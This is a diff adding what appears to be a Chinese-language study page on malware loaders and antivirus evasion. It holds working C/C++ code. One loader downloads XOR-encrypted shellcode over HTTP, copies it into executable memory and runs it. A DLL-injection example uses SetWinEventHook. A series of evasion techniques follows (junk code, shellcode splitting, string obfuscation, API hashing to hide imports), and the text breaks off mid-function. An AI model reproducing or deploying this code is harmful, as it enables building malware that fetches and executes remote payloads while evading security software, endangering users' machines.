+    printf(&quot;[+] Response retrieved\n&quot;);
+
+    do
+    {
+        dwSize = 0;
+        if (!WinHttpQueryDataAvailable(hHttpRequest, &amp;dwSize))
+        {
+            printf(&quot;Error %u in WinHttpQueryDataAvailable.\n&quot;, GetLastError());
+        }
+
+        // Allocate space for the buffer.
+        pszOutBuffer = new char[dwSize + 1];
+
+        // No more available data 
+        if (!pszOutBuffer) {
+            printf(&quot;[-] No more available data&quot;);
+            dwSize = 0;
+        }
+
+        // Read the Data.
+        ZeroMemory(pszOutBuffer, dwSize + 1);
+
+        if (!WinHttpReadData(hHttpRequest, (LPVOID)pszOutBuffer,
+            dwSize, &amp;dwDownloaded))
+            printf(&quot;Error %u in WinHttpReadData.\n&quot;, GetLastError());
+        else
+            PEbuffer.insert(PEbuffer.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
+
+    } while (dwSize &gt; 0);
+
+
+    char* PE = (char*)malloc(PEbuffer.size());
+    for (int i = 0; i &lt; PEbuffer.size(); i++) {
+        PE[i] = PEbuffer[i] ^ key; //XOR encrypted
+        printf(&quot;%x&quot;,PE[i]);
+    }
+    //到这里完成下载放入堆并亦或加密
+
+    printf(&quot;[+] Encrypted shellcode allocated in heap\n&quot;);   
+
+    // Set the base address of the current image.
+    PARAMS pParams;
+    pParams.pBaseAddress = (LPVOID)GetModuleHandleA(NULL);
+    ////printf(&quot;[+] Current image base address = 0x%p\n&quot;, pParams.pBaseAddress);
+    LPVOID pBuffer = VirtualAlloc(NULL, PEbuffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //分配RWX内存块
+    if (NULL == pBuffer) {
+        printf(&quot;[!] VirtualAlloc failed\n&quot;);
+        exit(1);
+    }
+
+    //printf(&quot;[+] Allocated space for the buffer %p\n&quot;, pBuffer);
+    XOR(PE, PEbuffer.size(), key); //decrypt the PE shellcode before writing to memory
+    // Copy the shellcode into it.
+    memcpy(pBuffer, PE, PEbuffer.size());  
+
+    //printf(&quot;[+] Shellcode decrypted and written\n&quot;);
+    //((void(*)())pBuffer)();
+    //到这里分配内存，把解密后的shellcode复制到pBuffer
+
+    //time for your creativity
+    //printf(&quot;[+] Encrypting the heap for 10 seconds\n&quot;);
+    HeapEncryptDecrypt();
+    //////Sleep(10);  //create your own sleep patch instead
+    ////printf(&quot;[+] Decrypting the heap\n&quot;);
+    HeapEncryptDecrypt();
+    fprun Run = (fprun)pBuffer;
+    Run(pParams);
+    //运行HeapEncryptDecrypt是干什么的，对当前堆加密再解密？有什么用
+
+    // Make a function pointer to the run function shellcode.
+
+    //这里是执行shellcode
+
+    // Close the HTTP request 
+    WinHttpCloseHandle(hHttpRequest);
+
+    // Close the session 
+    WinHttpCloseHandle(hHttpSession);
+
+    // Cleanup 
+    WinHttpCloseHandle(hInternet);
+
+    free(PE);
+
+    return 0;
+}
+
+</code></pre>
+<h2 id="peb">PEB学习</h2>
+<p>PEB是windows中的进程环境块，存储了进程相关的信息。
+在windbg中使用<code>dt _peb</code>可以查看当前进程的peb结构体，关键的三个参数</p>
+<pre><code>   +0x010 ImageBaseAddress : Ptr64 Void
+   +0x018 Ldr              : Ptr64 _PEB_LDR_DATA
+   +0x020 ProcessParameters : Ptr64 _RTL_USER_PROCESS_PARAMETERS
+</code></pre>
+<p>找到peb地址</p>
+<pre><code>0:024&gt; r $peb
+$peb=00000098d212b000
+</code></pre>
+<p>将地址应用到结构体中，观察<code>ImageBaseAddress</code></p>
+<pre><code>0:024&gt; dt _peb @$peb
+ntdll!_PEB
+   +0x000 InheritedAddressSpace : 0 ''
+   +0x001 ReadImageFileExecOptions : 0 ''
+   +0x002 BeingDebugged    : 0x1 ''
+   +0x003 BitField         : 0x34 '4'
+   +0x003 ImageUsesLargePages : 0y0
+   +0x003 IsProtectedProcess : 0y0
+   +0x003 IsImageDynamicallyRelocated : 0y1
+   +0x003 SkipPatchingUser32Forwarders : 0y0
+   +0x003 IsPackagedProcess : 0y1
+   +0x003 IsAppContainer   : 0y1
+   +0x003 IsProtectedProcessLight : 0y0
+   +0x003 IsLongPathAwareProcess : 0y0
+   +0x004 Padding0         : [4]  &quot;&quot;
+   +0x008 Mutant           : 0xffffffff`ffffffff Void
+   +0x010 ImageBaseAddress : 0x00007ff7`f8c90000 Void
+   +0x018 Ldr              : 0x00007ffb`bb5343c0 _PEB_LDR_DATA
+   +0x020 ProcessParameters : 0x0000019a`f7605040 _RTL_USER_PROCESS_PARAMETERS
+
+</code></pre>
+<p>查看<code>ImageBaseAddress</code>的内容</p>
+<pre><code>0:024&gt; db 0x00007ff7f8c90000
+00007ff7`f8c90000  4d 5a 00 00 00 00 00 00-00 00 00 00 00 00 00 00  MZ..............
+00007ff7`f8c90010  00 00 00 00 00 00 00 00-40 00 00 00 00 00 00 00  ........@.......
+00007ff7`f8c90020  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+00007ff7`f8c90030  00 00 00 00 00 00 00 00-00 00 00 00 40 00 00 00  ............@...
+00007ff7`f8c90040  50 45 00 00 64 86 04 00-66 42 69 63 00 00 00 00  PE..d...fBic....
+00007ff7`f8c90050  00 00 00 00 f0 00 22 00-0b 02 0b 00 00 02 00 00  ......&quot;.........
+00007ff7`f8c90060  3e 3f 00 00 00 00 00 00-00 70 00 00 00 70 00 00  &gt;?.......p...p..
+00007ff7`f8c90070  00 00 c9 f8 f7 7f 00 00-00 10 00 00 00 02 00 00  ................
+
+</code></pre>
+<p>和文件原始内容是相同的
+<img alt="" src="../../images/20230801104121.png" /></p>
+<p>直接查询<code>ImageBaseAddress</code></p>
+<pre><code>0:001&gt; dt _peb
+ntdll!_PEB
+      +0x010 ImageBaseAddress : Ptr64 Void
+
+0:001&gt; dd @$peb+0x010 L2
+000007ff`fffd5010  49d40000 00000000
+
+// 49d40000 00000000 is little-endian byte format - need to invert
+0:001&gt; db 0000000049d40000 L100
+</code></pre>
+<p><code>!peb</code></p>
+<h2 id="setwineventhook">使用SetWinEventHook来执行回调代码</h2>
+<p>SetWinEventHook是一个监控UI相关操作事件的钩子，可以通过它来使用callback执行想要的代码
+https://scorpiosoftware.net/2023/09/24/windows-hook-events/</p>
+<p>单exe</p>
+<pre><code class="language-c">// SimpleWinEventHook.cpp : This file contains the 'main' function. Program execution begins and ends there.
+//
+
+#include &quot;pch.h&quot;
+
+#pragma comment(lib, &quot;oleacc&quot;)
+
+const char* EventNameToString(DWORD event) {
+    switch (event) {
+        case EVENT_SYSTEM_SOUND: return &quot;Sound&quot;;
+        case EVENT_SYSTEM_ALERT: return &quot;Alert&quot;;
+        case EVENT_SYSTEM_FOREGROUND: return &quot;Foreground&quot;;
+        case EVENT_SYSTEM_MENUSTART: return &quot;Menu Start&quot;;
+        case EVENT_SYSTEM_MENUEND: return &quot;Menu End&quot;;
+        case EVENT_SYSTEM_CAPTURESTART: return &quot;Capture Start&quot;;
+        case EVENT_SYSTEM_CAPTUREEND: return &quot;Capture End&quot;;
+        case EVENT_SYSTEM_MOVESIZESTART: return &quot;Move/Size Start&quot;;
+        case EVENT_SYSTEM_MOVESIZEEND: return &quot;Move/Size End&quot;;
+        case EVENT_SYSTEM_DIALOGSTART: return &quot;Dialog Start&quot;;
+        case EVENT_SYSTEM_DIALOGEND: return &quot;Dialog End&quot;;
+        case EVENT_SYSTEM_SWITCHSTART: return &quot;Switch Start&quot;;
+        case EVENT_SYSTEM_SWITCHEND: return &quot;Switch End&quot;;
+        case EVENT_SYSTEM_MINIMIZESTART: return &quot;Minimize Start&quot;;
+        case EVENT_SYSTEM_MINIMIZEEND: return &quot;Minimize End&quot;;
+        case EVENT_OBJECT_CREATE: return &quot;Object Create&quot;;
+        case EVENT_OBJECT_DESTROY: return &quot;Object Destroy&quot;;
+        case EVENT_OBJECT_SHOW: return &quot;Object Show&quot;;
+        case EVENT_OBJECT_HIDE: return &quot;Object Hide&quot;;
+        case EVENT_OBJECT_STATECHANGE: return &quot;State Changed&quot;;
+        case EVENT_OBJECT_LOCATIONCHANGE: return &quot;Location Changed&quot;;
+        case EVENT_OBJECT_NAMECHANGE: return &quot;Name Change&quot;;
+        case EVENT_OBJECT_DESCRIPTIONCHANGE: return &quot;Desc Changed&quot;;
+        case EVENT_OBJECT_VALUECHANGE: return &quot;Value Changed&quot;;
+        case EVENT_OBJECT_PARENTCHANGE: return &quot;Parent Changed&quot;;
+    }
+    return &quot;&quot;;
+}
+
+void CALLBACK OnEvent(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd,
+    LONG idObject, LONG idChild, DWORD idEventThread, DWORD time) {
+    CComPtr&lt;IAccessible&gt; spAcc;
+    CComVariant child;
+    ::AccessibleObjectFromEvent(hwnd, idObject, idChild, &amp;spAcc, &amp;child);
+    CComBSTR name;
+    if (spAcc)
+        spAcc-&gt;get_accName(CComVariant(idChild), &amp;name);
+    DWORD pid = 16536;
+    WCHAR exeName[MAX_PATH];
+    PCWSTR pExeName = L&quot;&quot;;
+
+    if (hwnd &amp;&amp; ::GetWindowThreadProcessId(hwnd, &amp;pid)) {
+        auto hProcess = ::OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+        if (hProcess) {
+            DWORD size = _countof(exeName);
+            if (::QueryFullProcessImageName(hProcess, 0, exeName, &amp;size))
+                pExeName = wcsrchr(exeName, L'\\') + 1;
+            ::CloseHandle(hProcess);
+        }
+    }
+    printf(&quot;Event: 0x%X (%s) HWND: 0x%p, ID: 0x%X Child: 0x%X TID: %u PID: %u (%ws) Time: %u Name: %ws\n&quot;,
+        event, EventNameToString(event),
+        hwnd, idObject, idChild, idEventThread, 
+        pid, pExeName,
+        time, name.m_str);
+}
+
+int main() {
+    auto hHook = ::SetWinEventHook(EVENT_MIN, EVENT_MAX, nullptr, OnEvent, 0, 0,
+        WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS | WINEVENT_SKIPOWNTHREAD);
+
+    ::GetMessage(nullptr, nullptr, 0, 0);
+
+}
+
+</code></pre>
+<p>dll</p>
+<pre><code class="language-c">// WinHookInject.cpp : This file contains the 'main' function. Program execution begins and ends there.
+//
+
+#include &quot;pch.h&quot;
+
+int main(int argc, const char* argv[]) {
+    DWORD pid = argc &lt; 2 ? 0 : atoi(argv[1]);
+    if (pid == 0) {
+        printf(&quot;Warning: injecting to potentially processes with threads connected to the current desktop.\n&quot;);
+        printf(&quot;Continue? (y/n) &quot;);
+        char ans[3];
+        gets_s(ans);
+        if (tolower(ans[0]) != 'y')
+            return 0;
+    }
+
+    auto hLib = ::LoadLibrary(L&quot;Injected.Dll&quot;);
+    if (!hLib) {
+        printf(&quot;DLL not found!\n&quot;);
+        return 1;
+    }
+    auto OnEvent = (WINEVENTPROC)::GetProcAddress(hLib, &quot;OnEvent&quot;);
+    if (!OnEvent) {
+        printf(&quot;Event handler not found!\n&quot;);
+        return 1;
+    }
+    auto hHook = ::SetWinEventHook(0x0016, 0x0017,
+        hLib, OnEvent, pid, 0, WINEVENT_INCONTEXT);
+    if (!hHook) {
+        printf(&quot;Failed!\n&quot;);
+        return 1;
+    }
+    //
+    // keep process alive
+    //
+    ::GetMessage(nullptr, nullptr, 0, 0);
+
+    return 0;
+}
+
+
+</code></pre>
+<pre><code class="language-c">#include &quot;pch.h&quot;
+
+#pragma comment(lib, &quot;oleacc&quot;)
+
+const char* EventNameToString(DWORD event) {
+    switch (event) {
+        case EVENT_SYSTEM_SOUND: return &quot;Sound&quot;;
+        case EVENT_SYSTEM_ALERT: return &quot;Alert&quot;;
+        case EVENT_SYSTEM_FOREGROUND: return &quot;Foreground&quot;;
+        case EVENT_SYSTEM_MENUSTART: return &quot;Menu Start&quot;;
+        case EVENT_SYSTEM_MENUEND: return &quot;Menu End&quot;;
+        case EVENT_SYSTEM_CAPTURESTART: return &quot;Capture Start&quot;;
+        case EVENT_SYSTEM_CAPTUREEND: return &quot;Capture End&quot;;
+        case EVENT_SYSTEM_MOVESIZESTART: return &quot;Move/Size Start&quot;;
+        case EVENT_SYSTEM_MOVESIZEEND: return &quot;Move/Size End&quot;;
+        case EVENT_SYSTEM_DIALOGSTART: return &quot;Dialog Start&quot;;
+        case EVENT_SYSTEM_DIALOGEND: return &quot;Dialog End&quot;;
+        case EVENT_SYSTEM_SWITCHSTART: return &quot;Switch Start&quot;;
+        case EVENT_SYSTEM_SWITCHEND: return &quot;Switch End&quot;;
+        case EVENT_SYSTEM_MINIMIZESTART: return &quot;Minimize Start&quot;;
+        case EVENT_SYSTEM_MINIMIZEEND: return &quot;Minimize End&quot;;
+
+        case EVENT_OBJECT_CREATE: return &quot;Object Create&quot;;
+        case EVENT_OBJECT_DESTROY: return &quot;Object Destroy&quot;;
+        case EVENT_OBJECT_SHOW: return &quot;Object Show&quot;;
+        case EVENT_OBJECT_HIDE: return &quot;Object Hide&quot;;
+        case EVENT_OBJECT_STATECHANGE: return &quot;State Changed&quot;;
+        case EVENT_OBJECT_LOCATIONCHANGE: return &quot;Location Changed&quot;;
+        case EVENT_OBJECT_NAMECHANGE: return &quot;Name Change&quot;;
+        case EVENT_OBJECT_DESCRIPTIONCHANGE: return &quot;Desc Changed&quot;;
+        case EVENT_OBJECT_VALUECHANGE: return &quot;Value Changed&quot;;
+        case EVENT_OBJECT_PARENTCHANGE: return &quot;Parent Changed&quot;;
+    }
+    return &quot;&quot;;
+}
+
+HANDLE hConsole;
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, PVOID lpReserved) {
+    switch (reason) {
+        case DLL_PROCESS_DETACH:
+            if (hConsole)   // be nice
+                ::CloseHandle(hConsole);
+            break;
+
+        case DLL_PROCESS_ATTACH:
+            if (::AllocConsole()) {
+                auto hConsole = ::CreateFile(L&quot;CONOUT$&quot;, GENERIC_WRITE, 
+                    0, nullptr, OPEN_EXISTING, 0, nullptr);
+                if (hConsole == INVALID_HANDLE_VALUE)
+                    return FALSE;
+                ::SetStdHandle(STD_OUTPUT_HANDLE, hConsole);
+            }
+            break;
+    }
+    return TRUE;
+}
+
+extern &quot;C&quot; __declspec(dllexport)
+void CALLBACK OnEvent(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd,
+    LONG idObject, LONG idChild, DWORD idEventThread, DWORD time) {
+    CComPtr&lt;IAccessible&gt; spAcc;
+    CComVariant child;
+    ::AccessibleObjectFromEvent(hwnd, idObject, idChild, &amp;spAcc, &amp;child);
+    CComBSTR name;
+    if (spAcc)
+        spAcc-&gt;get_accName(CComVariant(idChild), &amp;name);
+
+    printf(&quot;Event: 0x%X (%s) HWND: 0x%p, ID: 0x%X Child: 0x%X TID: %u Time: %u Name: %ws\n&quot;,
+        event, EventNameToString(event),
+        hwnd, idObject, idChild, idEventThread,
+        time, name.m_str);
+    system(&quot;calc.exe&quot;);
+}
+
+</code></pre>
+<h2 id="shellcode_3">各种shellcode</h2>
+<p>https://osandamalith.com/shellcodes/</p>
+<h1 id="_8">防御规避</h1>
+<h2 id="_9">过动态的方式</h2>
+<h3 id="_10">白利用</h3>
+<pre><code>
+</code></pre>
+<h3 id="_11">新注入技术</h3>
+<pre><code>
+</code></pre>
+<h3 id="syscall">直接/间接syscall</h3>
+<h3 id="api-hash">API HASH</h3>
+<h3 id="api">使用原生API</h3>
+<h2 id="_12">过静态的方式</h2>
+<h3 id="_13">空函数</h3>
+<pre><code class="language-C">疯狂添加空函数
+void dummyFunction() {
+
+}
+dummyFunction();
+
+</code></pre>
+<h3 id="_14">无意义语句</h3>
+<pre><code>像什么数值运算之类的
+int a = 0; 
+a = a + 1;
+</code></pre>
+<h3 id="sleep">Sleep延时</h3>
+<pre><code>Sleep函数会出现在导入表中
+Sleep(1);  //延时1毫秒
+</code></pre>
+<h3 id="_15">空循环，也是延时</h3>
+<pre><code class="language-C">
+int a = 0;
+void delay() { for (volatile int i = 0; i &lt; 1000000; i++) 
+{ 
+   a = a + 2;
+}
+delay()
+</code></pre>
+<h3 id="_16">新建函数指针间接调用</h3>
+<pre><code class="language-C">
+代码演示创建了一个指向CreateEventW函数的函数指针类型CreateEventWPtr，通过这个类型新建createEventW来间接调用CreateEventW
+
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+typedef HANDLE(WINAPI *CreateEventWPtr)(
+    LPSECURITY_ATTRIBUTES lpEventAttributes,
+    BOOL bManualReset,
+    BOOL bInitialState,
+    LPCWSTR lpName
+);
+
+int main() {
+    HMODULE hKernel32 = GetModuleHandle(&quot;kernel32.dll&quot;);
+    if (hKernel32 == NULL) {
+        printf(&quot;Failed to load kernel32.dll\n&quot;);
+        return 1;
+    }
+
+    CreateEventWPtr createEventW = (CreateEventWPtr)GetProcAddress(hKernel32, &quot;CreateEventW&quot;);
+    if (createEventW == NULL) {
+        printf(&quot;Failed to get address of CreateEventW\n&quot;);
+        return 1;
+    }
+
+    HANDLE hEvent = createEventW(NULL, TRUE, FALSE, L&quot;MyEvent&quot;);
+
+    if (hEvent == NULL) {
+        printf(&quot;Failed to create event\n&quot;);
+        return 1;
+    }
+
+    printf(&quot;Event created successfully\n&quot;);
+
+    return 0;
+}
+</code></pre>
+<h3 id="_17">多添加函数调用,产生无意义结果</h3>
+<p>多添加点函数，调用这些函数产生无意义的结果，让更多正常函数出现在导入表中。
+使用哪些正常函数可参照正常程序。
+不然直接看到除了OpenProcess、VirtualAlloc、memcpy、processHandle这种就没有其他的函数了，一眼就知道是马</p>
+<pre><code class="language-C">lstrlenW函数
+    LPCWSTR str = L&quot;Hello, World!&quot;;
+    lstrlenW(str);
+
+
+其他....
+</code></pre>
+<h3 id="shellcode_4">shellcode分离再组合</h3>
+<p>把shellcode分成两段，再组合</p>
+<pre><code>unsigned char shellcode[] = &quot;\xfd\x48\x83\xe4\xf0&quot;;
+char first[] = &quot;\xfc&quot;;
+
+memcpy(shellcode, first, 1);   //把first的1个字节复制到shellcdoe里，复制是由前往后复制的，这里的复制是覆盖，要复制多少过去，就要在原shellcode需要填充多少字节的数据
+
+
+</code></pre>
+<h3 id="_18">关键字数组化处理</h3>
+<p>加载dll时使用数组可打乱针对dll名称关键字的静态查杀</p>
+<p>假如<code>LoadLibraryA("NTDLL.DLL")</code>被杀，可以采用以下方式解决</p>
+<pre><code class="language-cpp">CHAR NameStr[] = {'A','D','V','A','P','I','3','2','.','D','L','L','\0'};
+LoadLibraryA(NameStr);
+
+</code></pre>
+<p>还可以用数组拆分方式进一步打乱关键字</p>
+<pre><code class="language-cpp">CHAR NameStr[] = {'A','D','V','A','P','I','3','2','\0'};
+CHAR OtherStr[] = {'.','D','L','L','\0'};
+
+CHAR CombinedStr[sizeof(NameStr) + sizeof(OtherStr)];
+
+strcpy(CombinedStr, NameStr);
+strcat(CombinedStr, OtherStr);
+
+LoadLibraryA(CombinedStr);
+
+</code></pre>
+<h2 id="hook">绕杀软hook</h2>
+<p>这里需要明白一个基本道理，系统级别的函数都是在<code>ntdll.dll</code>中，函数调用需要在内存中找到函数的地址，然后才可以调用。</p>
+<h3 id="api-hash_1">使用API-HASH</h3>
+<pre><code>通过函数名称计算一个hash值，再反计算hash值得到函数名，再根据函数名查找函数地址，新建一个相同的函数指针来调用原函数
+</code></pre>
+<pre><code class="language-powershell">##第一步，计算要隐藏的函数hash,其中$hash和0xab10f2ff可以自定义，以CreateProcessA为例，计算的hash是0x005882941
+
+$APIsToHash = @(&quot;CreateProcessA&quot;)
+
+$APIsToHash | % {
+    $api = $_
+
+    $hash = 0x44
+    [int]$i = 0
+
+    $api.ToCharArray() | % {
+        $l = $_
+        $c = [int64]$l
+        $c = '0x{0:x}' -f $c
+        $hash += $hash * 0xab10f2ff + $c -band 0xffffff
+        $hashHex = '0x{0:x}' -f $hash
+        $i++
+        write-host &quot;Iteration $i : $l : $c : $hashHex&quot;
+    }
+    write-host &quot;$api`t $('0x00{0:x}' -f $hash)&quot;
+}
+</code></pre>
+<pre><code class="language-C">//第二步，编写相应hash解密函数与函数地址查找函数
+DWORD getHashFromString(char* string)
+{
+    size_t stringLength = strnlen_s(string, 50);
+    DWORD hash = 0x44;
+
+    for (size_t i = 0; i &lt; stringLength; i++)
+    {
+        hash += (hash * 0xab10f2ff + string[i]) &amp; 0xffffff;
+    }
+    // printf(&quot;%s: 0x00%x\n&quot;, string, hash);
+
+    return hash;
+}
+
+PDWORD getFunctionAddressByHash(char* library, DWORD hash)
+{
+    PDWORD functionAddress = (PDWORD)0;
+
+    // Get base address of the module in which our exported function of interest resides (kernel32 in the case of CreateThread)
+    HMODULE libraryBase = LoadLibraryA(library);
+
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
+    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader-&gt;e_lfanew);
+
+    DWORD_PTR exportDirectoryRVA = imageNTHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+
+    PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);
+
+    // Get RVAs to exported function related information
+    PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-&gt;AddressOfFunctions);
+    PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-&gt;AddressOfNames);
+    PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory-&gt;AddressOfNameOrdinals);
+
+    // Iterate through exported functions, calculate their hashes and check if any of them match our hash of 0x00544e304 (CreateThread)
+    // If yes, get its virtual memory address (this is where CreateThread function resides in memory of our process)
+    for (DWORD i = 0; i &lt; imageExportDirectory-&gt;NumberOfFunctions; i++)
+    {
+        DWORD functionNameRVA = addressOfNamesRVA[i];
+        DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
+        char* functionName = (char*)functionNameVA;
+        DWORD_PTR functionAddressRVA = 0;
+
+        // Calculate hash for this exported function
+        DWORD functionNameHash = getHashFromString(functionName);
+
+        // If hash for CreateThread is found, resolve the function address
+        if (functionNameHash == hash)
+        {
+            functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
+            functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
+            printf(&quot;%s : 0x%x : %p\n&quot;, functionName, functionNameHash, functionAddress);
+            return functionAddress;
+        }
+    }
+}
+</code></pre>
+<pre><code class="language-c">//第三步，新建一个相对应的函数指针
+using NewCreateProcessA = BOOL(WINAPI*)(
+    LPCSTR                lpApplicationName,
+    LPSTR                 lpCommandLine,
+    LPSECURITY_ATTRIBUTES lpProcessAttributes,
+    LPSECURITY_ATTRIBUTES lpThreadAttributes,
+    BOOL                  bInheritHandles,
+    DWORD                 dwCreationFlags,
+    LPVOID                lpEnvironment,
+    LPCSTR                lpCurrentDirectory,
+    LPSTARTUPINFOA        lpStartupInfo,
+    LPPROCESS_INFORMATION lpProcessInformation
+    );
+
+</code></pre>
+<pre><code class="language-c">//第四步，在main函数引用这个新函数
+
+int main(){
+
+PDWORD functionAddress = nullptr;  //指针初始化
+functionAddress = getFunctionAddressByHash((char*)&quot;kernel32&quot;, 0x005882941);  
+//得到函数地址
+NewCreateProcessA CreateProcessB = (NewCreateProcessA)functionAddress;
+//新建一个函数类型
+
+//引用CreateProcessB
+    STARTUPINFOA si = {};
+    PROCESS_INFORMATION pi = {};
+    CreateProcessB(NULL, (LPSTR)&quot;C:\\Windows\\System32\\notepad.exe&quot;, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi);
+
+}
+
+</code></pre>
+<p>打开了notepad，但导入表中没有CreateProcessA
+<img alt="" src="../../images/20230714140012.png" /></p>
+<h3 id="api-hash2getmodulehandlegetprocaddress">API-HASH2（GetModuleHandle和GetProcAddress）</h3>
+<p>定义不同的函数需要实现不同的函数原型</p>
+<p>头文件定义类型</p>
+<pre><code class="language-c++">// typedefs.h
+#pragma once
+#include &lt;Windows.h&gt;
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+
+typedef struct _LDR_MODULE {
+    LIST_ENTRY              InLoadOrderModuleList;
+    LIST_ENTRY              InMemoryOrderModuleList;
+    LIST_ENTRY              InInitializationOrderModuleList;
+    PVOID                   BaseAddress;
+    PVOID                   EntryPoint;
+    ULONG                   SizeOfImage;
+    UNICODE_STRING          FullDllName;
+    UNICODE_STRING          BaseDllName;
+    ULONG                   Flags;
+    SHORT                   LoadCount;
+    SHORT                   TlsIndex;
+    LIST_ENTRY              HashTableEntry;
+    ULONG                   TimeDateStamp;
+} LDR_MODULE, * PLDR_MODULE;
+
+typedef struct _PEB_LDR_DATA {
+    BYTE       Reserved1[8];
+    PVOID      Reserved2[3];
+    LIST_ENTRY InMemoryOrderModuleList;
+} PEB_LDR_DATA, * PPEB_LDR_DATA;
+
+typedef struct _RTL_USER_PROCESS_PARAMETERS {
+    ULONG                   MaximumLength;
+    ULONG                   Length;
+    ULONG                   Flags;
+    ULONG                   DebugFlags;
+    PVOID                   ConsoleHandle;
+    ULONG                   ConsoleFlags;
+    HANDLE                  StdInputHandle;
+    HANDLE                  StdOutputHandle;
+    HANDLE                  StdErrorHandle;
+    UNICODE_STRING          CurrentDirectoryPath;
+    HANDLE                  CurrentDirectoryHandle;
+    UNICODE_STRING          DllPath;
+    UNICODE_STRING          ImagePathName;
+    UNICODE_STRING          CommandLine;
+    PVOID                   Environment;
+} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;
+
+typedef struct _PEB {
+    BYTE                          Reserved1[2];
+    BYTE                          BeingDebugged;
+    BYTE                          Reserved2[1];
+    PVOID                         Reserved3[2];
+    PPEB_LDR_DATA                 Ldr;
+    PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
+    BYTE                          Reserved4[104];
+    PVOID                         Reserved5[52];
+    PVOID                         PostProcessInitRoutine;
+    BYTE                          Reserved6[128];
+    PVOID                         Reserved7[1];
+    ULONG                         SessionId;
+} PEB, * PPEB;
+
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG Length;
+    HANDLE RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor;
+    PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES;
+typedef OBJECT_ATTRIBUTES* POBJECT_ATTRIBUTES;
+
+#define InitializeObjectAttributes( p, n, a, r, s ) { \
+    (p)-&gt;Length = sizeof( OBJECT_ATTRIBUTES );          \
+    (p)-&gt;RootDirectory = r;                             \
+    (p)-&gt;Attributes = a;                                \
+    (p)-&gt;ObjectName = n;                                \
+    (p)-&gt;SecurityDescriptor = s;                        \
+    (p)-&gt;SecurityQualityOfService = NULL;               \
+    }
+
+typedef struct _CLIENT_ID
+{
+    PVOID UniqueProcess;
+    PVOID UniqueThread;
+} CLIENT_ID, * PCLIENT_ID;
+
+
+// NTAPI function types
+typedef NTSTATUS(NTAPI* typeNtOpenProcess)(_Out_ PHANDLE ProcessHandle, _In_ ACCESS_MASK DesiredAccess, _In_ POBJECT_ATTRIBUTES ObjectAttributes, _In_opt_ PCLIENT_ID ClientId);
+typedef NTSTATUS(NTAPI* typeNtAllocateVirtualMemory)(_In_ HANDLE ProcessHandle, _Inout_ PVOID* BaseAddress, _In_ ULONG_PTR ZeroBits, _Inout_ PSIZE_T RegionSize, _In_ ULONG AllocationType, _In_ ULONG Protect);
+typedef NTSTATUS(NTAPI* typeNtProtectVirtualMemory)(_In_ HANDLE ProcessHandle, _Inout_ PVOID* BaseAddress, _Inout_ PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessPRotection);
+typedef NTSTATUS(NTAPI* typeNtWriteVirtualMemory)(_In_ HANDLE ProcessHandle, _In_ PVOID BaseAddress, _In_ PVOID Buffer, _In_ ULONG NumberOfBytesToWrite, _Out_ PULONG NumberOfBytesWritten OPTIONAL);
+typedef NTSTATUS(NTAPI* typeNtClose)(_In_ HANDLE Handle);
+</code></pre>
+<p>主文件</p>
+<pre><code class="language-c++">#include &lt;windows.h&gt;
+#include &quot;typedefs.h&quot;
+#include &lt;stdio.h&gt;
+
+#define HashStringA(x) HashStringFowlerNollVoVariant1aA(x)
+#define HashStringW(x) HashStringFowlerNollVoVariant1aW(x)
+#define HashStringNtdll 0x467f5122
+#define HashNtCreateFile 0x20ef5396   //这里可以直接定义也可以HashStringA来计算，计算传入的必须是小写
+
+ULONG HashStringFowlerNollVoVariant1aA(_In_ LPCSTR String)
+{
+    ULONG Hash = 0x6A6CCC06;
+
+    while (*String)
+    {
+        Hash ^= (UCHAR)*String++;
+        Hash *= 0x25EDE3FB;
+    }
+
+    return Hash;
+}
+ULONG HashStringFowlerNollVoVariant1aW(_In_ LPCWSTR String)
+{
+    ULONG Hash = 0x6A6CCC06;
+
+    while (*String)
+    {
+        Hash ^= (UCHAR)*String++;
+        Hash *= 0x25EDE3FB;
+    }
+
+    return Hash;
+}
+
+HMODULE _GetModuleHandle(_In_ ULONG dllHash)
+{
+    PLIST_ENTRY head = (PLIST_ENTRY) &amp; ((PPEB)__readgsqword(0x60))-&gt;Ldr-&gt;InMemoryOrderModuleList;
+    PLIST_ENTRY next = head-&gt;Flink;
+
+    PLDR_MODULE module = (PLDR_MODULE)((PBYTE)next - 16);
+
+    while (next != head)
+    {
+        module = (PLDR_MODULE)((PBYTE)next - 16);
+        if (module-&gt;BaseDllName.Buffer != NULL)
+        {
